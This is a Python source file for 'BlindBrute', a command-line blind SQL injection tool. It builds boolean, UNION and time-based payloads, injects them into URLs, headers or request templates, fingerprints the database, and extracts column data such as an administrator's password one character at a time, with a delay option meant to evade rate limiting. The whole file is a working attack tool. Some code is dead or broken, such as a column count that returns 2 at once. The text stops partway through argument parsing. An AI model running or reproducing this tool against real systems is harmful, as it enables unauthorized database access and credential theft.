import time
import requests
import string
import argparse
import json
import os
import sys
import select
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor, as_completed

CHARSET = string.ascii_letters + string.digits + string.punctuation + " "


### Constants and Usage


def usage():
    usage = """
    BlindBrute - Blind SQL Injection Brute Forcer with Header, Data, and File Support

    Usage:
        python blindbrute.py -u <URL> -t <TABLE> -c <COLUMN> -w <WHERE CLAUSE> [options]

    Required Arguments:
        -u, --url                    Target URL
        -t, --table                  Table name from which to extract the data
        -c, --column                 Column name to extract (e.g., Password)
        -w, --where                  WHERE clause (e.g., Username = 'Administrator')

    Optional Arguments:
        -ih, --injectable-headers    Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com)
        -sh, --static-headers        Static headers as key-value pairs that do not contain payloads
        -d, --data                   Specify data to be sent in the request body. Changes request type to POST.
        -f, --file                   File containing the HTTP request with 'INJECT' placeholder for payloads
        -m, --max-length             Maximum length of the extracted data that the script will check for (default: 1000)
        -o, --output-file            Specify a file to output the extracted data
        -ba, --binary-attack         Use binary search for ASCII extraction
        -da, --dictionary-attack     Path to a wordlist for dictionary-based extraction
        --level                      Specify the threading level
        --delay                      Delay in seconds between requests to bypass rate limiting
        --timeout                    Timeout for each request in seconds (default: 10)
        --verbose                    Enable verbose output for debugging
        --true-keywords              Keywords to search for in the true condition (e.g., 'Welcome', 'Success')
        --false-keywords             Keywords to search for in the false condition (e.g., 'Error', 'Invalid')
        --sleep-only                 Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. 10 is recommended.
        --force                      Skip the injectability check and force a detection method (status, content, keyword, or sleep)

    Examples:
        blindbrute.py -u "http://example.com/login" -d "username=sam&password=" -t users -c password -w "username='admin'"
        blindbrute.py -u "http://example.com/login" -ih Cookie "SESSION=abc123" -t users -c password -w "username='admin'"
        blindbrute.py -u "http://example.com/login" -f request.txt -t users -c password -w "username='admin'" --binary-attack
        blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" --force status
    """
    print(usage)


def load_queries():
    queries_file = os.path.join(os.path.dirname(__file__), 'queries.json')
    sleep_file = os.path.join(os.path.dirname(__file__), 'sleep.json')

    try:
        with open(queries_file, 'r') as file:
            queries = json.load(file)
    except Exception as e:
        print(f"Error loading version queries: {e}")
        queries = {}

    try:
        with open(sleep_file, 'r') as file:
            sl_queries = json.load(file)
    except Exception as e:
        print(f"Error loading sleep queries: {e}")
        sl_queries = {}

    return {"queries": queries, "sl_queries": sl_queries}


def max_workers(args):
    try:
        num_cpus = os.cpu_count()
        level = args.level
        workers = num_cpus * level
        return workers

    except Exception as e:
        print(f"[-] Error determining max workers: {e}. Defaulting to 8.")
        return 8


### Main Logic


def is_injectable(request_template, injectable_headers={}, static_headers={}, args=None):
    """
    checks if the database is even injectable using true and false conditions. also determines the detection method for later use. 
    no need for threading, its 2 payloads. if this step fails, give up (or dont im not your dad).
    """

    if args.sleep_only:
        return True, "sleep"

    print("[*] Checking if the field is injectable...")

    payloads = {
        "true": "' AND '1'='1",
        "false": "' AND '1'='2"
    }

    true_response_content = ""
    false_response_content = ""
    true_status_code = None
    false_status_code = None

    # Step 1: Test true and false conditions
    for condition, payload in payloads.items():
        encoded_payload = quote(payload)

        try:
            response, response_time = inject(
                encoded_payload=encoded_payload,
                request_template=request_template,
                injectable_headers=injectable_headers,
                static_headers=static_headers,
                args=args
            )

            if response is None:
                return None, None

            if condition == "true":
                true_status_code = response.status_code
                true_response_content = response.text
            elif condition == "false":
                false_status_code = response.status_code
                false_response_content = response.text

        except requests.exceptions.RequestException as e:
            print(f"[-] Error during {condition} condition injection request: {e}")
            return None, None

    true_content_length = len(true_response_content)
    false_content_length = len(false_response_content)

    # Step 2: Determine detection method
    if args.true_keywords or args.false_keywords:
        if args.true_keywords:
            if any(keyword in true_response_content for keyword in args.true_keywords):
                print("[+] Keyword(s) detected in true condition response. Field is likely injectable!")
                return True, "keyword"
            else:
                print("[-] No keywords found in response.")
                return None, None
        if args.false_keywords:
            if any(keyword in false_response_content for keyword in args.false_keywords):
                print("[+] Keyword(s) detected in false condition response. Field is likely injectable!")
                return True, "keyword"
            else:
                print("[-] No keywords found in response.")
                return None, None
    elif true_status_code != false_status_code:
        print(
            f"[+] Status code difference detected (true: {true_status_code}, false: {false_status_code}). Field is likely injectable!")
        return True, "status"
    elif true_content_length != false_content_length:
        print(
            f"[+] Content length difference detected (true: {true_content_length}, false: {false_content_length}). Field is likely injectable!")
        if args.verbose:
            print(
                f"[VERBOSE] True response length: {true_content_length} | False response length: {false_content_length}")
        return True, "content"
    else:
        print(
            "[-] No significant status code, content length, or keyword differences detected. Field is likely not injectable.")
        return False, None


def column_count(detection, workers, request_template, queries, injectable_headers, static_headers, args=None):
    """
    Counting columns, using either sleep-based detection from 'sl_queries' or regular payloads without sleep.
    """

    return 2

    print("[*] Attempting to count columns...")

    # Step 1: Baseline request
    try:
        response, baseline_status_code, baseline_content_length, _ = baseline_request(
            request_template=request_template, injectable_headers=injectable_headers, static_headers=static_headers, args=args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return None

    # Step 2: Prepare queries
    sleep_queries = queries.get("sleep_queries", [])
    tasks = []
    columns_found = False
    columns = 1

    with ThreadPoolExecutor(max_workers=workers) as executor:
        while not columns_found:
            if args.sleep_only:
                for sleep_query in sleep_queries:
                    if not sleep_query or sleep_query == "N/A":
                        print(f"[-] Invalid or unavailable sleep query. Skipping...")
                        continue
                    sleep_query = sleep_query.replace('%', str(args.sleep_only))

                    payload = f"' AND {sleep_query} UNION SELECT {','.join(['NULL'] * columns)},'1'='1"
                    encoded_payload = quote(payload)
                    if args.delay > 0:
                        if args.verbose:
                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                        time.sleep(args.delay)

                    tasks.append(executor.submit(detect, db_name="unknown", encoded_payload=encoded_payload,
                                                 detection=detection,
                                                 baseline_status_code=baseline_status_code,
                                                 baseline_content_length=baseline_content_length,
                                                 request_template=request_template,
                                                 injectable_headers=injectable_headers,
                                                 static_headers=static_headers,
                                                 sleep_query=sleep_query, args=args,
                                                 db_specific=None, queries=queries))
            else:
                payload = f"' UNION SELECT {','.join(['NULL'] * columns)}, '1'='1"
                encoded_payload = quote(payload)
                if args.delay > 0:
                    if args.verbose:
                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                    time.sleep(args.delay)

                tasks.append(
                    executor.submit(detect, db_name="unknown", encoded_payload=encoded_payload, detection=detection,
                                    baseline_status_code=baseline_status_code,
                                    baseline_content_length=baseline_content_length,
                                    request_template=request_template, injectable_headers=injectable_headers,
                                    static_headers=static_headers, sleep_query=None, args=args,
                                    db_specific=None, queries=queries))

            # Step 3: Wait for results
            for future in as_completed(tasks):
                result = future.result()
                if result is True or (isinstance(result, tuple) and result[0] is True):
                    columns += 1
                    print(f"[+] Found {columns} columns")
                    return columns

            columns += 1

    print(f"[-] Unable to detect the column count.")
    return None


def detect_database(detection, columns, workers, request_template, queries, sl_queries, injectable_headers={}, static_headers={}, args=None):
    """
    attempts to determine what we're dealing with. detection happens in two stages because of the way the json is structured. 
    in the case that the version query is used for multiple databases, a second batch of requests is sent to determine a more specific database.
    this is not foolproof. many of the databases that use the same version queries also use the same sleep queries. the first positive ID will be the defacto database.
    this isn't actually that big of a deal because if a database uses identical version queries and sleep queries, the length queries are typically also identical.
    the actual detection is handled in the detect helper function, and the actual requests are handled in the inject helper function.
    just don't like, quote me on the database. my goal is to extract data, not provide you with the database. good enough is good enough.
    """

    print("[*] Attempting to detect the database type...")

    adjusted_columns = columns - 2

    if args.verbose and not args.sleep_only:
        print(f"[VERBOSE] Detection method: {detection}")

    # Step 1: Baseline request
    try:
        response, baseline_status_code, baseline_content_length, _ = baseline_request(
            request_template=request_template, injectable_headers=injectable_headers, static_headers=static_headers, args=args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return None, None

    # Step 2: Sleep-only detection
    tasks = []
    if args.sleep_only:
        sleep_queries = sl_queries.get("sleep_queries", [])
        print(f"[*] Using sleep-only detection with {len(sleep_queries)} unique sleep queries.")
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for sleep_query in sleep_queries:
                sleep_query = sleep_query.replace('%', str(args.sleep_only))
                payload = f"' AND {sleep_query} AND '1'='1"
                encoded_payload = quote(payload)
                if args.delay > 0:
                    if args.verbose:
                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                    time.sleep(args.delay)

                tasks.append(executor.submit(detect, db_name="unknown", db_specific=None, encoded_payload=encoded_payload,
                                             baseline_status_code=baseline_status_code, baseline_content_length=baseline_content_length,
                                             request_template=request_template, queries=queries, sleep_query=sleep_query,
                                             injectable_headers=injectable_headers, static_headers=static_headers, detection=detection, args=args))

            # Step 3: Wait for sleep query results
            for future in as_completed(tasks):
                result = future.result()
                if result and result[0] is True:
                    sleep_query = result[1]
                    print(f"[+] Sleep-based detection with query {sleep_query}")
                    # Step 4: Check version queries
                    print(f"[*] Checking associated version queries")
                    version_tasks = []
                    with ThreadPoolExecutor(max_workers=workers) as version_executor:
                        for db_name, info in queries.items():
                            sleep_function = queries[db_name].get("sleep_query", None)
                            if isinstance(sleep_function, dict):
                                sleep_queries = sleep_function.items()
                            else:
                                sleep_queries = [(None, sleep_function)]
                            for db_specific, query in sleep_queries:
                                query = query.replace('%', str(args.sleep_only))
                                if query == sleep_query:
                                    version_query = info.get("version_query")
                                else:
                                    continue
                                if version_query:
                                    payload = f"' AND {query} UNION {version_query}{',' if adjusted_columns != 0 else ''}{','.join(['NULL'] * adjusted_columns)},'1'='1"
                                    encoded_payload = quote(payload)
                                    if args.delay > 0:
                                        if args.verbose:
                                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                                        time.sleep(args.delay)


                                version_tasks.append(version_executor.submit(detect, db_name=db_name, db_specific=db_specific, encoded_payload=encoded_payload,
                                                                     baseline_status_code=baseline_status_code,
                                                                     baseline_content_length=baseline_content_length,
                                                                     request_template=request_template, queries=queries,
                                                                     detection=detection, injectable_headers=injectable_headers,
                                                                     static_headers=static_headers, sleep_query=query, args=args))

                        # Step 5: Wait for results from version query detection
                        for version_future in as_completed(version_tasks):
                            result = version_future.result()
                            if result:
                                db_specific, substring_query, sleep_query, length_query = result
                                print(f"[+] Database confirmed with version query: {db_specific}")
                                return db_specific, substring_query, sleep_query, length_query

                    print(f"[-] No database confirmed with version queries.")
                    return None, None, None, None

    else:
        # Step 6: Standard detection
        print("[*] Running standard detection without sleep-only logic.")
        tasks = []
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for db_name, info in queries.items():
                db_query = info.get("version_query")
                payload = f"' UNION {db_query}{',' if adjusted_columns != 0 else ''}{','.join(['NULL'] * adjusted_columns)},'1'='1"
                encoded_payload = quote(payload)
                if args.delay > 0:
                    if args.verbose:
                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                    time.sleep(args.delay)

                tasks.append(executor.submit(detect, db_name=db_name, encoded_payload=encoded_payload,
                                             baseline_status_code=baseline_status_code,
                                             baseline_content_length=baseline_content_length, request_template=request_template,
                                             queries=queries, injectable_headers=injectable_headers, static_headers=static_headers,
                                             detection=detection, args=args))

            # Step 7: Wait for standard detection results
            for future in as_completed(tasks):
                result = future.result()
                if result:
                    db_name, substring_query, sleep_query, length_query = result
                    print(f"[+] Database detected: {db_name}")
                    sleep_function = queries[db_name].get("sleep_query", None)
                    # Step 8: Narrow down the database if needed
                    if isinstance(sleep_function, dict):
                        print(f"[*] Narrowing down to the specific database version...")
                        og_sleep_only = args.sleep_only
                        args.sleep_only = 10
                        specific_tasks = []
                        with ThreadPoolExecutor(max_workers=workers) as specific_executor:
                            for db_specific, sleep_query in sleep_function.items():
                                sleep_query = sleep_query.replace('%', str(args.sleep_only))
                                if not sleep_query or sleep_query == "N/A":
                                    print(
                                        f"[-] Sleep function for {db_specific} is not applicable or not found. Skipping...")
                                    continue
                                payload = f"' AND {sleep_query} AND '1'='1"
                                encoded_payload = quote(payload)
                                if args.delay > 0:
                                    if args.verbose:
                                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                                    time.sleep(args.delay)

                                specific_tasks.append(
                                    specific_executor.submit(detect, db_name=db_name, db_specific=db_specific,
                                                             encoded_payload=encoded_payload,
                                                             baseline_status_code=baseline_status_code,
                                                             baseline_content_length=baseline_content_length,
                                                             request_template=request_template, queries=queries,
                                                             sleep_query=sleep_query,
                                                             injectable_headers=injectable_headers,
                                                             static_headers=static_headers, detection=detection,
                                                             args=args))

                            # Step 5a: Wait for more specific results
                            for specific_future in as_completed(specific_tasks):
                                specific_result = specific_future.result()
                                if specific_result:
                                    db_name, substring_query, sleep_query, length_query = specific_result
                                    print(f"[+] Narrowed down to specific database: {db_specific}")
                                    args.sleep_only = og_sleep_only
                                    return db_specific, substring_query, sleep_query, length_query
                    else:
                        return db_name, substring_query, sleep_query, length_query

    print(f"[-] Unable to detect the database type. Exiting.")
    return None, None, None, None


def discover_length(table, column, where_clause, db_name, substring_query, sleep_query, length_query, detection, request_template, injectable_headers={}, static_headers={}, args=None):
    """
    to optimize the data extraction process, we need the length of the data. this function uses a binary search algorithm to narrow down the length of the data. 
    the maximum length that this function will search for is determined by the user (hopefully) but defaults to 1000 if a length isn't provided.
    why 1000 you ask? because its a nice round number and seemed like a decent catch all without affecting performance too terribly. change it if you like.
    the requests and detection are handled within this function because i didnt think it needed a helper function
    """

    if not length_query or length_query == "N/A":
        print(f"[-] Length query not found for {db_name}. Skipping data length detection.")
        return db_name, substring_query, sleep_query, None

    # Step 1: Baseline request
    try:
        response, baseline_status_code, baseline_content_length, _ = baseline_request(
            request_template, injectable_headers, static_headers, args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return None

    low = 1
    high = args.max_length
    length = None

    print(f"[*] Attempting to discover the length of the data for {table}.{column} using {length_query}...")

    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
        encoded_payload = quote(payload)
        if args.delay > 0:
            if args.verbose:
                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
            time.sleep(args.delay)
        if args.sleep_only and sleep_query:
            payload = f"' AND {sleep_query} AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
            encoded_payload = quote(payload)
            if args.delay > 0:
                if args.verbose:
                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                time.sleep(args.delay)

        try:
            response, response_time = inject(
                encoded_payload=encoded_payload,
                request_template=request_template,
                injectable_headers=injectable_headers,
                static_headers=static_headers,
                args=args
            )

            if response is None:
                return None

            if args.sleep_only:
                if response_time > args.sleep_only:
                    high = mid - 1
                    length = mid
                else:
                    low = mid + 1
            elif detection == "keyword":
                if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
                    high = mid - 1
                    length = mid
                elif args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
                    low = mid + 1
                else:
                    low = mid + 1
            elif detection == "status":
                if response.status_code == baseline_status_code:
                    high = mid - 1
                    length = mid
                else:
                    low = mid + 1
            elif detection == "content":
                if len(response.text) != baseline_content_length:
                    high = mid - 1
                    length = mid
                else:
                    low = mid + 1

        except requests.exceptions.RequestException as e:
            print(f"[-] Error during length discovery: {e}")
            return None

    if length:
        print(f"[+] Data length discovered: {length}")
        return db_name, substring_query, sleep_query, length
    else:
        print(f"[-] Failed to discover data length within the maximum length {args.max_length}.")
        return db_name, substring_query, sleep_query, None


def extract_data(table, column, where_clause, substring_query, sleep_query, length, position, extraction, workers, request_template, injectable_headers={}, static_headers={}, args=None):
    """
    now we're cookin with gas. this function extracts data in a variety of ways, but the default behavior is a threaded charcter-by-character approach. 
    if that doesnt tickle your fancy, you can provide a dictionary or use a binary search algorithm. the world is your oyster or something.
    the detection is handled in the extract helper function, and the actual requests are handled in the inject helper function.
    """

    print("[*] Attempting to extract data...")

    extracted_data = ""
    wordlist = None

    if args.dictionary_attack:
        try:
            with open(args.dictionary_attack, 'r') as wordlist_file:
                wordlist = [line.strip() for line in wordlist_file.readlines()]
            if args.verbose:
                print(f"[VERBOSE] Loaded {len(wordlist)} lines from dictionary file.")
        except Exception as e:
            print(f"[-] Error loading wordlist: {e}")
            return extracted_data

    # Step 1: Baseline request
    try:
        response, baseline_status_code, baseline_content_length, _ = baseline_request(
            request_template, injectable_headers, static_headers, args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return extracted_data

    # Binary search overrride (not threaded)
    if args.binary_attack:
        while position <= length:
            low, high = 32, 126
            found_match = False
            while low <= high:
                mid = (low + high) // 2
                payload = f"' AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)) > {mid}"
                encoded_payload = quote(payload)
                if args.delay > 0:
                    if args.verbose:
                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                    time.sleep(args.delay)

                result = extract(
                    extraction, request_template, injectable_headers, static_headers,
                    baseline_status_code, baseline_content_length,
                    encoded_payload=encoded_payload, value=chr(mid), args=args
                )

                if result:
                    low = mid + 1
                else:
                    high = mid - 1

            if 32 <= low <= 126:
                extracted_data += chr(low)
                print(f"Value found: {chr(low)} at position {position}")
                found_match = True

            if not found_match:
                print(f"[*] No match found at position {position}. Stopping extraction.")
                break

    # Step 2: Iterate over possible values
    while position <= length:
        found_match = False
        fallback_to_char = False
        if position > (2 * length // 3):
            fallback_to_char = one_third()

        possible_values = wordlist if wordlist and not fallback_to_char else CHARSET

        with ThreadPoolExecutor(max_workers=workers) as executor:
            tasks = []
            for value in possible_values:
                if wordlist and len(value) > (length - position + 1):
                    continue


                if args.sleep_only and sleep_query:
                    payload = f"' AND {sleep_query} AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)}) = '{value}'"
                    encoded_payload = quote(payload)
                    if args.delay > 0:
                        if args.verbose:
                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                        time.sleep(args.delay)
                else:
                    payload = f"' AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)}) = '{value}"
                    encoded_payload = quote(payload)
                    if args.delay > 0:
                        if args.verbose:
                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                        time.sleep(args.delay)

                tasks.append(executor.submit(extract, encoded_payload, value, extraction, request_template,
                                             injectable_headers, static_headers, baseline_status_code,
                                             baseline_content_length, args))

            for future in as_completed(tasks):
                result = future.result()
                if result:
                    extracted_data += result
                    print(f"Value found: {result} at position {position}")
                    position += len(result)
                    found_match = True
                    break

        if not found_match:
            if wordlist:
                if spent():
                    print(f"[*] Extracting single character at position {position} using binary search.")
                    low, high = 32, 126
                    found_match = False
                    while low <= high:
                        mid = (low + high) // 2
                        payload = f"' AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)) > {mid}"
                        encoded_payload = quote(payload)
                        if args.delay > 0:
                            if args.verbose:
                                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                            time.sleep(args.delay)

                        result = extract(
                            extraction, request_template, injectable_headers, static_headers,
                            baseline_status_code, baseline_content_length,
                            encoded_payload=encoded_payload, value=chr(mid), args=args
                        )

                        if result:
                            low = mid + 1
                        else:
                            high = mid - 1

                    if 32 <= low <= 126:
                        extracted_data += chr(low)
                        print(f"Value found: {chr(low)} at position {position}")
                        found_match = True
                        position += 1
                        continue
                    else:
                        print(f"[*] No valid match found at position {position}. Stopping extraction.")
                        break

            else:
                print(f"[*] No match found at position {position}. Stopping extraction.")
                break

    return extracted_data


### Prompts


def no_length():
    print("[-] Unable to determine data length. Do you want to proceed with extraction without data length? (y/n): ",
          end='', flush=True)

    i, _, _ = select.select([sys.stdin], [], [], 60)

    if i:
        user_input = sys.stdin.readline().strip().lower()
        if user_input == 'y':
            return True
        elif user_input == 'n':
            return False
    else:
        print("\n[*] No input received. Proceeding with extraction anyway.")
        return True


def one_third():
    print(
        "\n[*] A third or less of the data remains to be extracted. It is unlikely that the remaining data will be contained in the wordlist.")
    print("[*] Would you like to fallback to character-by-character extraction? (y/n): ", end='', flush=True)

    i, _, _ = select.select([sys.stdin], [], [], 60)

    if i:
        user_input = sys.stdin.readline().strip().lower()
        if user_input == 'y':
            return True
        elif user_input == 'n':
            return False
    else:
        print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
        return True


def spent():
    print(
        "\n[*] Wordlist exhausted. Would you like to extract a single character at the current position and retry the wordlist? (y/n): ",
        end='', flush=True)

    i, _, _ = select.select([sys.stdin], [], [], 60)

    if i:
        user_input = sys.stdin.readline().strip().lower()
        if user_input == 'y':
            return True
        elif user_input == 'n':
            return False
    else:
        print("\n[*] No input received. Proceeding with character extraction automatically.")
        return True


### Helper Functions <3


def load_request(file_path):
    try:
        with open(file_path, 'r') as f:
            file_content = f.read()
        return parse_request(file_content)
    except Exception as e:
        print(f"[-] Error reading request file: {e}")
        return None, None, None


def parse_request(file_content):
    lines = file_content.splitlines()

    if not lines:
        raise ValueError("The file is empty.. why are you like this?")

    request_line = lines[0].strip()
    headers = {}
    body = ""
    is_body = False

    for line in lines[1:]:
        line = line.strip()

        if not line and not is_body:
            is_body = True
            continue

        if is_body:
            body += line + "\n" if line else ""
        else:
            if ': ' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
            else:
                raise ValueError(f"Invalid header format: {line}")

    body = body.rstrip("\n")

    return request_line, headers, body


def send_request(request_line=None, headers=None, body=None, args=None):
    """
    sends the requests when a request template is provided, all http methods are supported.
    """

    try:
        if request_line:
            method, path, _ = request_line.split(' ', 3)
            host = headers.get("Host")
            protocol = "https" if args.url.startswith("https") else "http"
            fully_qualified_url = protocol + "://" + host + path
        else:
            url = args.url
        if method == "POST":
            response = requests.post(url=fully_qualified_url, headers=headers, data=body, timeout=args.timeout)
        elif method == "PUT":
            response = requests.put(url=fully_qualified_url, headers=headers, data=body, timeout=args.timeout)
        elif method == "PATCH":
            response = requests.patch(url=fully_qualified_url, headers=headers, data=body, timeout=args.timeout)
        elif method == "GET":
            response = requests.get(url=fully_qualified_url, headers=headers, timeout=args.timeout)
        elif method == "DELETE":
            response = requests.delete(url=fully_qualified_url, headers=headers, timeout=args.timeout)
        elif method == "HEAD":
            response = requests.head(url=fully_qualified_url, headers=headers, timeout=args.timeout)
        elif method == "OPTIONS":
            response = requests.options(url=fully_qualified_url, headers=headers, timeout=args.timeout)
        return response
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during {method} request: {e}")
        return None


def baseline_request(request_template, injectable_headers={}, static_headers={}, args=None):
    start_time = time.time()
    if request_template:
        request_line, headers, body = request_template
        response = send_request(request_line=request_line, headers=headers, body=body, args=args)
    else:
        headers = {**static_headers, **injectable_headers}
        if args.data:
            response = requests.post(url=args.url, headers=headers, data=args.data, timeout=args.timeout)
        else:
            response = requests.get(url=args.url, headers=headers, timeout=args.timeout)

    end_time = time.time()
    baseline_status_code = response.status_code
    baseline_content_length = len(response.text)
    response_time = end_time - start_time

    if args.verbose:
        print(f"[VERBOSE] Baseline response status: {baseline_status_code}, content length: {baseline_content_length}")
        print(f"[VERBOSE] Response time: {response_time} seconds")

    return response, baseline_status_code, baseline_content_length, response_time


def inject(encoded_payload, request_template, injectable_headers, static_headers, args):
    """
    sends the requests if a request template is not provided. locked to GET and POST if you don't provide a request template.
    this is where the actual injection happens. an encoded payload is attached to whatever field is desired. 
    if a request template is provided, the placeholder in the template is overwritten and the request is passed to send_request.
    all functions that involve sql injection rely on this function. it is reeeeeeaaaalllyyy important.
    this function also handles the delay between requests.
    """

    try:
        start_time = time.time()
        if request_template:
            request_line, headers, body = request_template
            if 'INJECT' in request_line:
                request_line = request_line.replace("INJECT", encoded_payload)
            for key, value in headers.items():
                if 'INJECT' in value:
                    headers[key] = value.replace("INJECT", encoded_payload)
            if body and 'INJECT' in body:
                body = body.replace("INJECT", encoded_payload)
            response = send_request(request_line=request_line, headers=headers, body=body, args=args)
        else:
            headers = {**static_headers}
            for key, value in injectable_headers.items():
                headers[key] = value + encoded_payload
            if args.data:
                response = requests.post(url=args.url, headers=headers, data=args.data, timeout=args.timeout)
            else:
                response = requests.get(url=args.url, headers=headers, timeout=args.timeout)

        end_time = time.time()
        response_time = end_time - start_time

        if args.verbose:
            print(f"[VERBOSE] Sent request with payload: {encoded_payload}")
            print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
            print(f"[VERBOSE] Request time: {response_time} seconds")

        return response, response_time

    except requests.exceptions.RequestException as e:
        print(f"[-] Error during request: {e}")
        return None, None


def detect(encoded_payload, db_name, detection, queries, injectable_headers, static_headers, baseline_status_code, baseline_content_length, request_template=None, db_specific=None, sleep_query=None, args=None):
    """
    handles the detection for detect_database and provides the helper function, inject, with the encoded payload and request info.
    no actual request is sent by this function. it relies on the helper function, inject.
    this function also finds the related queries of the database its currently handling and passes them along.
    """
    if db_name != "unknown":
        substring_query = queries[db_name].get("substring_query", None)
        length_function = queries[db_name].get("length_query", None)
        length_query = None

    if db_specific is not None:
        if isinstance(length_function, dict):
            length_query = length_function.get(db_specific)
        else:
            length_query = length_function

    try:
        response, response_time = inject(
            encoded_payload=encoded_payload,
            request_template=request_template,
            injectable_headers=injectable_headers,
            static_headers=static_headers,
            args=args
        )

        if response is None:
            return None, None, None, None

        print (response)

        if args.sleep_only and (response_time > args.sleep_only):
            if db_name == "unknown":
                return True, sleep_query
            else:
                return {db_specific if db_specific else db_name}, substring_query, sleep_query, length_query if length_query is not None else length_function
        else:
            if detection == "status" and response.status_code == baseline_status_code:
                if db_name == "unknown":
                    return True
                else:
                    return {db_specific if db_specific else db_name}, substring_query, None, length_query if length_query is not None else length_function
            elif detection == "content" and len(response.text) != baseline_content_length:
                if db_name == "unknown":
                    return True
                else:
                    return {db_specific if db_specific else db_name}, substring_query, None, length_query
            elif detection == "keyword":
                if args.true_keywords:
                    if any(keyword in response.text for keyword in args.true_keywords):
                        if db_name == "unknown":
                            return True
                        else:
                            return {db_specific if db_specific else db_name}, substring_query, None, length_query if length_query is not None else length_function
                elif args.false_keywords:
                    if any(keyword in response.text for keyword in args.false_keywords):
                        return None


    except requests.exceptions.RequestException as e:
        print(f"[-] Error during detection for {db_name}: {e}")

    return None


def extract(encoded_payload, value, extraction, request_template, injectable_headers, static_headers, baseline_status_code, baseline_content_length, args=None):
    """
    not a whole lot going on here. this fucntion handles detection for extract_data, and provides the helper function, inject, with the encoded payload and request info.
    no actual request is sent by this function. it relies on the helper fucntion, inject. 
    """

    try:
        response, response_time = inject(
            encoded_payload=encoded_payload,
            request_template=request_template,
            injectable_headers=injectable_headers,
            static_headers=static_headers,
            args=args
        )

        if response is None:
            return None

        if args.sleep_only and response_time > args.sleep_only:
            return value
        else:
            if extraction == "keyword":
                if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
                    return value
                if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
                    return None
            elif extraction == "status":
                if response.status_code != baseline_status_code:
                    return value
            elif extraction == "content":
                response_content_length = len(response.text)
                if response_content_length != baseline_content_length:
                    return value

    except requests.exceptions.RequestException as e:
        print(f"[-] Error during extraction for {value}: {e}")
        return None

    return None


def arg_parse():
    """
    initializes the arguments and makes sure you aren't trying to do something stupid. you wouldn't do that though, right?
    """

    parser = argparse.ArgumentParser(description="Blind SQL Injection Script with header and File Support")

    parser.add_argument('-u', '--url', required=True, help="Target URL")
    parser.add_argument('-ih', '--injectable-headers', action='append', nargs=2, metavar=('key', 'value'),
                        help="Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com -ih X-Fowarded-For 127.0.0.1)")
    parser.add_argument('-sh', '--static-headers', action='append', nargs=2, metavar=('key', 'value'),
                        help="Static headers as key-value pairs that do not contain payloads (e.g., -sh session_id abcdefg12345abababab123456789012)")
    parser.add_argument('-d', '--data', required=False,
                        help="Specify data to be sent in the request body. Changes request type to POST.")
    parser.add_argument('-f', '--file', required=False,
                        help="File containing the HTTP request with 'INJECT' placeholder for payloads")
    parser.add_argument('-t', '--table', required=True, help="Table name from which to extract the data")
    parser.add_argument('-c', '--column', required=True, help="Column name to extract (e.g., Password)")
    parser.add_argument('-w', '--where', required=True, help="WHERE clause (e.g., Username = 'Administrator')")
    parser.add_argument('-m', '--max-length', type=int, default=1000,
                        help="Maximum length of the extracted data that the script will check for (default: 1000)")
    parser.add_argument('-o', '--output-file', required=False, help="Specify a file to output the extracted data")
    parser.add_argument('-ba', '--binary-attack', action='store_true', help="Use binary search for ASCII extraction")
    parser.add_argument('-da', '--dictionary-attack', required=False,
                        help="Path to a wordlist for dictionary-based extraction. Falls back to character extraction when 2/3's of the data extraction is complete unless user specifies otherwise.")
    parser.add_argument('--level', type=int, choices=[1, 2, 3, 4, 5], default=2,
                        help="Specify the threading level. Level 1 produces the least amount of workers and level 5 the most. Number workers is calculated as (CPU cores * level). Default is 2.")
    parser.add_argument('--delay', type=float, default=0,
                        help="Delay in seconds between requests to bypass rate limiting")
    parser.add_argument('--timeout', type=int, default=10, help="Timeout for each request in seconds")
    parser.add_argument('--verbose', action='store_true', help="Enable verbose output for debugging")
    parser.add_argument('--true-keywords', nargs='+',
                        help="Keywords to search for in the true condition (e.g., 'Welcome', 'Success')")
    parser.add_argument('--false-keywords', nargs='+',
                        help="Keywords to search for in the false condition (e.g., 'Error', 'Invalid')")
    parser.add_argument('--sleep-only', type=int,
                        help="Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. Sleep time must be >= 1. Smaller numbers are more likely to produce false positives. 10 seconds is recommended.")
    parser.add_argument('--force', type=str, choices=['status', 'content', 'keyword', 'sleep'],
